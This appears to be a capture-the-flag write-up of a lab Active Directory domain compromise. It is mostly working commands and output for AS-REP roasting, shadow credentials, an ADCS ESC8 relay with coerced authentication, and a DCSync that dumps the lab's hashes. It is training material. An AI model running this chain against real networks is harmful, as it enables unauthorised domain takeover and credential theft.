---
title: "ShadowGate"
platform: "HackSmarter"
category: "Active Directory"
difficulty: "Easy"
date: 2026-05-11
os: "Windows Server 2022"
tags: ["active-directory", "windows", "asreproast", "hashcat", "rusthound", "bloodhound", "shadow-credentials", "genericwrite", "adcs", "esc8", "ntlm-relay", "certipy", "pkinit", "unpac-the-hash", "dcsync", "secretsdump", "kerberos", "smb"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/shadowgate/banner.png" alt="ShadowGate Banner" style="max-width: 100%;" />
</div>

---

## Scenario

ShadowGate recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

**Platform:** HackSmarter
**Difficulty:** Hard
**OS:** Windows Server 2022
**IP:** `10.1.83.236`
**Hostname:** `DC01.shadow.gate`

---

## Executive Summary

- **AS-REP Roasting** — `jtrueblood` had Kerberos pre-authentication disabled, returning a crackable AS-REP hash without any credentials.
- **Shadow Credentials via GenericWrite** — `jtrueblood` held `GenericWrite` over `bbrown`, allowing injection of a shadow credential to retrieve bbrown's NT hash via PKINIT without knowing their password.
- **ADCS ESC8** — Web enrollment was exposed over HTTP with SMB signing not required, enabling NTLM relay from a coerced DC authentication to obtain a `DC01$` certificate.
- **UnPAC-the-hash + DCSync** — The DC01$ certificate was used for PKINIT authentication to extract the machine account NT hash, then `secretsdump` replicated all domain credentials.

**Risk Rating:** Critical

---

## Attack Chain Summary

```
Null Session → AS-REP Roast (jtrueblood) → Crack Hash → BloodHound
→ GenericWrite → Shadow Credentials (bbrown) → ADCS ESC8 Relay
→ DC01$ Certificate → PKINIT → DCSync → Domain Admin
```

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  Null Session → User Enumeration → AS-REP Roast (jtrueblood)   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Hashcat → blood_brothers → BloodHound (jtrueblood)             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  GenericWrite → Shadow Credentials → bbrown NT Hash             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  CertEnroll Share → ADCS ESC8 (HTTP Web Enrollment + No Signing)│
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  certipy relay + coercer → DC01$ Certificate (dc01.pfx)         │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  PKINIT + UnPAC-the-hash → DC01$ NT Hash → DCSync → DA          │
└─────────────────────────────────────────────────────────────────┘
```

---

# Enumeration

## Nmap

Initial port scan to identify open services and versions. The results confirm a Windows domain controller for `shadow.gate` with SMB signing not required — a key prerequisite for NTLM relay attacks.

```bash
nmap -sCV 10.1.83.236
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-11 22:24 PDT
Nmap scan report for 10.1.83.236
Host is up (0.070s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-12 05:24:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-12T05:25:28+00:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
```

## Hosts Setup

SMB accepts a null session (empty username and password), which lets us auto-populate `/etc/hosts` with the DC hostname. Null authentication also unlocks unauthenticated LDAP and user enumeration.

```bash
nxc smb 10.1.83.236 -u '' -p '' --generate-hosts-file /etc/hosts
```

```
SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.83.236     445    DC01             [+] shadow.gate\:
```

```
10.1.83.236     DC01.shadow.gate shadow.gate DC01
```

## User Enumeration (Null Session)

Null session access lets us dump all domain user accounts without any credentials. This gives us a target list for AS-REP roasting and password spraying.

```bash
nxc smb 10.1.83.236 -u '' -p '' --users
```

```
SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.83.236     445    DC01             [+] shadow.gate\:
SMB         10.1.83.236     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.1.83.236     445    DC01             Administrator                 2026-01-11 11:33:05 0       Built-in account for administering the computer/domain
SMB         10.1.83.236     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.1.83.236     445    DC01             krbtgt                        2026-01-12 02:45:27 0       Key Distribution Center Service Account
SMB         10.1.83.236     445    DC01             ATHENA                        2026-03-04 15:23:19 0
SMB         10.1.83.236     445    DC01             mbrownlee                     2026-03-04 15:24:05 0
SMB         10.1.83.236     445    DC01             bbrown                        2026-01-15 14:24:07 0
SMB         10.1.83.236     445    DC01             jtrueblood                    2026-04-28 18:14:47 0
SMB         10.1.83.236     445    DC01             jsmith                        2026-03-04 15:26:29 0
SMB         10.1.83.236     445    DC01             clocke                        2026-03-04 15:24:32 0
SMB         10.1.83.236     445    DC01             tclarke                       2026-03-04 15:25:33 0
SMB         10.1.83.236     445    DC01             jbradford                     2026-03-04 15:24:59 0
SMB         10.1.83.236     445    DC01             amoss                         2026-03-04 15:25:52 0
SMB         10.1.83.236     445    DC01             [*] Enumerated 12 local users: SHADOW
```

## AS-REP Roasting

Accounts with Kerberos pre-authentication disabled will return an encrypted AS-REP ticket to anyone who asks — no password required. `jtrueblood` has pre-auth disabled, so the DC hands back a hash we can crack offline.

```bash
nxc ldap 10.1.83.236 -u 'users.txt' -p '' --asreproast results.txt
```

```
LDAP        10.1.83.236     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never)
LDAP        10.1.83.236     389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:dee85896b8dcd010d8869ab759d4e8db$587db1f1ef95b889b66f0c484853966550478a2286e992ff1d5b84b1ddbbfa7df4dce4ffd774802b27209223d9a4fbb440f14c51d8fbfecc61dca1898dff2834d0033828062492e451df5ccd92bc347eb779c79e3f039634b410e24bcf0463d8d4ef10482457312a2024d0f9bf2d2c9e91ef3e193b564ad1f013aadc2a57a6c87339b906add890643647f230fdc53c493a904a521f85b91d8badee45d3d54355ae130b16bc3fbcbc433892b77d54661435af252ba094fd2ebd70405d485f4225e510b4a52f8a2e3ef5e051a40291472ec70b9372d460332823cf991f96ee51622ec4044d62e91a90f4fb
```

## Cracking the Hash

Hashcat mode 18200 cracks Kerberos AS-REP hashes offline against `rockyou.txt`. `jtrueblood`'s hash falls quickly.

```bash
hashcat -m 18200 jtrueblood /usr/share/wordlists/rockyou.txt
```

```
$krb5asrep$23$jtrueblood@SHADOW.GATE:...:blood_brothers
```

**Credentials:** `jtrueblood` : `blood_brothers`

---

# BloodHound Enumeration

## RustHound

RustHound collects all AD objects, ACLs, group memberships, and trust relationships and outputs BloodHound-compatible JSON. Importing into BloodHound reveals that `jtrueblood` holds `GenericWrite` over `bbrown`, which opens a Shadow Credentials path.

```bash
rusthound-ce -d shadow.gate -u jtrueblood@shadow.gate -p 'blood_brothers' -o /workspace -z
```

```
---------------------------------------------------
Initializing RustHound-CE at 22:47:46 on 05/11/26
Powered by @g0h4n_0
---------------------------------------------------

[*] Collection method: All
[*] Connected to SHADOW.GATE Active Directory!
[*] Starting data collection...
[*] All data collected for NamingContext DC=shadow,DC=gate
[*] Parsing LDAP objects finished!
[*] 13 users parsed!
[*] 61 groups parsed!
[*] 1 computers parsed!
[*] 1 enterprisecas parsed!
[*] Found 11 enabled certificate templates
[*] /workspace/20260511224750_shadow-gate_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 22:47:50 on 05/11/26! Happy Graphing!
```

`jtrueblood` has `GenericWrite` to `bbrown`:

<div style="text-align: center;">
  <img src="/assets/images/ctf/shadowgate/bloodhound-genericwrite.png" alt="BloodHound - jtrueblood GenericWrite over bbrown" style="max-width: 100%;" />
</div>

---

# Lateral Movement — jtrueblood → bbrown

## Shadow Credentials via GenericWrite

`GenericWrite` on a user object allows writing to the `msDS-KeyCredentialLink` attribute. Certipy abuses this to add a shadow credential (a certificate key pair) tied to bbrown's account, then authenticates as bbrown via PKINIT to retrieve their NT hash — without ever knowing their password.

```bash
certipy shadow auto -u jtrueblood@shadow.gate -p 'blood_brothers' -account bbrown -dc-ip 10.1.83.236
```

```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'bbrown'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '027aa8d445a3477d86a8a3bd1a88279e'
[*] Adding Key Credential with device ID '027aa8d445a3477d86a8a3bd1a88279e' to the Key Credentials for 'bbrown'
[*] Successfully added Key Credential with device ID '027aa8d445a3477d86a8a3bd1a88279e' to the Key Credentials for 'bbrown'
[*] Authenticating as 'bbrown' with the certificate
[*] Using principal: 'bbrown@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bbrown.ccache'
[*] Trying to retrieve NT hash for 'bbrown'
[*] Restoring the old Key Credentials for 'bbrown'
[*] Successfully restored the old Key Credentials for 'bbrown'
[*] NT hash for 'bbrown': 259745cb123a52aa2e693aaacca2db52
```

Verify the hash works:

```bash
nxc smb 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52'
```

```
SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.83.236     445    DC01             [+] shadow.gate\bbrown:259745cb123a52aa2e693aaacca2db52
```

**Credentials:** `bbrown` : `259745cb123a52aa2e693aaacca2db52` (NT hash)

## Share Enumeration

As `bbrown`, enumerate accessible SMB shares. The presence of a readable `CertEnroll` share is a strong indicator that ADCS web enrollment is exposed and worth investigating.

```bash
nxc smb 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52' --shares
```

```
SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.83.236     445    DC01             [+] shadow.gate\bbrown:259745cb123a52aa2e693aaacca2db52
SMB         10.1.83.236     445    DC01             [*] Enumerated shares
SMB         10.1.83.236     445    DC01             Share           Permissions     Remark
SMB         10.1.83.236     445    DC01             -----           -----------     ------
SMB         10.1.83.236     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.83.236     445    DC01             C$                              Default share
SMB         10.1.83.236     445    DC01             CertEnroll      READ            Active Directory Certificate Services share
SMB         10.1.83.236     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.83.236     445    DC01             NETLOGON        READ            Logon server share
SMB         10.1.83.236     445    DC01             SYSVOL          READ            Logon server share
```

## Spider Shares

`spider_plus` recursively lists and catalogs all files across accessible shares. Finding the CA certificate and CRL in `CertEnroll` confirms an active ADCS deployment — enough to justify running `certipy find` for vulnerability enumeration.

```bash
nxc smb 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52' -M spider_plus
```

```
SPIDER_PLUS 10.1.83.236     445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, CertEnroll, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.1.83.236     445    DC01             [*] SMB Readable Shares:  4 (CertEnroll, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.1.83.236     445    DC01             [*] Total folders found:  22
SPIDER_PLUS 10.1.83.236     445    DC01             [*] Total files found:    9
SPIDER_PLUS 10.1.83.236     445    DC01             [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.1.83.236.json".
```

```json
{
    "CertEnroll": {
        "DC01.shadow.gate_shadow-DC01-CA.crt": { "size": "877 B" },
        "nsrev_shadow-DC01-CA.asp": { "size": "323 B" },
        "shadow-DC01-CA+.crl": { "size": "725 B" },
        "shadow-DC01-CA.crl": { "size": "914 B" }
    }
}
```

---

# Privilege Escalation — ADCS ESC8

## ADCS Enumeration

Query LDAP for the ADCS Certificate Authority name and enrollment server — needed to target certipy. This confirms the CA is `shadow-DC01-CA` running on `DC01.shadow.gate`.

```bash
nxc ldap 10.1.83.236 -u 'bbrown' -H '259745cb123a52aa2e693aaacca2db52' -M adcs
```

```
LDAP        10.1.83.236     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.1.83.236     389    DC01             Found PKI Enrollment Server: DC01.shadow.gate
ADCS        10.1.83.236     389    DC01             Found CN: shadow-DC01-CA
```

The nmap scan already flagged `Message signing enabled but not required` on SMB, and certipy confirms the web enrollment endpoint only supports HTTP — no HTTPS. These two conditions make ESC8 viable: we can coerce the DC to authenticate to us over SMB, relay that NTLM authentication to the unprotected HTTP enrollment endpoint, and request a certificate on behalf of the DC machine account.

```bash
certipy find -dc-ip 10.1.83.236 -u 'bbrown@shadow.gate' -hashes ':259745cb123a52aa2e693aaacca2db52' -vulnerable -stdout
```

```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
Certificate Authorities
  0
    CA Name                             : shadow-DC01-CA
    DNS Name                            : DC01.shadow.gate
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Permissions
      Access Rights
        Enroll                          : SHADOW.GATE\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
```

Web Enrollment is enabled over HTTP — ESC8 confirmed.

## ESC8 — NTLM Relay to ADCS Web Enrollment

Start the certipy relay first. It listens on port 445 and forwards incoming NTLM authentication to the HTTP enrollment endpoint.

```bash
certipy relay -target http://10.1.83.236/certsrv/ -ca 'shadow-DC01-CA' -template 'DomainController'
```

In a second terminal, use coercer to force DC01 to authenticate to our machine via MS-EFSR (EFS RPC). The DC's machine account NTLM auth is relayed to `/certsrv/` and a certificate is issued for DC01$.

```bash
coercer coerce -l 10.200.55.198 -t 10.1.83.236 -u bbrown --hashes ':259745cb123a52aa2e693aaacca2db52' -d shadow.gate
```

```
[info] Starting coerce mode
[info] Scanning target 10.1.83.236
[+] SMB named pipe '\PIPE\efsrpc' is accessible!
   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
      [!] (NO_AUTH_RECEIVED) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.200.55.198\aNRrCFPk\file.txt')
```

Certipy relay receives the coerced auth and issues the DC01$ certificate:

```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting http://10.1.83.236/certsrv/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] (SMB): Received connection from 10.1.83.236, attacking target http://10.1.83.236
[*] (SMB): Authenticating connection from /@10.1.83.236 against http://10.1.83.236 SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] http:///@10.1.83.236 [1] -> HTTP Request: POST http://10.1.83.236/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 3
[*] Got certificate with DNS Host Name 'DC01.shadow.gate'
[*] Certificate object SID is 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

## PKINIT + UnPAC-the-hash

Authenticate with the DC01$ certificate via PKINIT. Certipy then performs UnPAC-the-hash to extract the NT hash from the PAC in the Kerberos response.

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.1.83.236
```

```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531
```

**Credentials:** `dc01$` : `57867e655d1abc9f45fd6e954e351531` (NT hash)

---

# Domain Compromise — DCSync

With DC01$'s NT hash we can DCSync the entire domain using the DRSUAPI replication protocol. Domain controllers have replication rights by design — no additional privilege escalation needed.

```bash
secretsdump.py 'shadow.gate/dc01$@10.1.83.236' -hashes ':57867e655d1abc9f45fd6e954e351531'
```

```
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e09802:::
shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:3215f4c7c852647c88694ab0b57daaba:::
shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:6f16868319543175e7f3e6d4eea9adfb:::
shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:27e133a345b980d24e3a60f169f2cb7e:::
shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:be0b6d125a6645747d91d30ed3bef98f:::
shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:ff506444e2c59b0241812e8e17b0f05e:::
shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:9290a555713c7db0cf7fbf0ac28c1100:::
shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:f5c86043de2a116c6458f3de9aad89de:::
shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:381480af4a988ad46758c2f79ee64090:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:6bf0048464b8fdf7a2db10f4799715a0c6471ac724424007e95bf55cd6841445
krbtgt:aes256-cts-hmac-sha1-96:9d2c8f2fecd0d6813cde513680b594210cf9c91bc2d4f6715ce25972b6a7c7c5
[*] Cleaning up...
```

Domain fully compromised. Verify Administrator access:

```bash
nxc smb 10.1.83.236 -u Administrator -H '4366ec0f86e29be2a4a5e87a1ba922ec'
```

```
SMB         10.1.83.236     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.83.236     445    DC01             [+] shadow.gate\Administrator:4366ec0f86e29be2a4a5e87a1ba922ec (Pwn3d!)
```

---

## Credentials Summary

```
Phase 1 - Initial Access
────────────────────────────────────────────────────────────────
jtrueblood      : blood_brothers              → AS-REP Roast + Hashcat

Phase 2 - Lateral Movement
────────────────────────────────────────────────────────────────
bbrown          : 259745cb123a52aa2e693aaacca2db52  → Shadow Credentials (GenericWrite)

Phase 3 - Domain Compromise
────────────────────────────────────────────────────────────────
dc01$           : 57867e655d1abc9f45fd6e954e351531  → ESC8 Relay + PKINIT (UnPAC-the-hash)
Administrator   : 4366ec0f86e29be2a4a5e87a1ba922ec  → DCSync
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **NetExec (nxc)** - SMB/LDAP enumeration, credential validation, ADCS discovery
- **RustHound-CE** - BloodHound data collection
- **BloodHound** - Active Directory attack path analysis
- **Certipy** - Shadow Credentials, ADCS vulnerability enumeration, ESC8 relay, PKINIT auth
- **Coercer** - MS-EFSR-based authentication coercion (PetitPotam)
- **Hashcat** - Offline AS-REP hash cracking
- **Impacket** (`secretsdump.py`) - DCSync via DRSUAPI

---

## References

- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [HackTricks - Shadow Credentials](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/shadow-credentials)
- [HackTricks - ADCS ESC8](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#web-enrollment-esc8)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Coercer Documentation](https://github.com/p0dalirius/Coercer)
- [elad-shamir - Shadow Credentials research](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
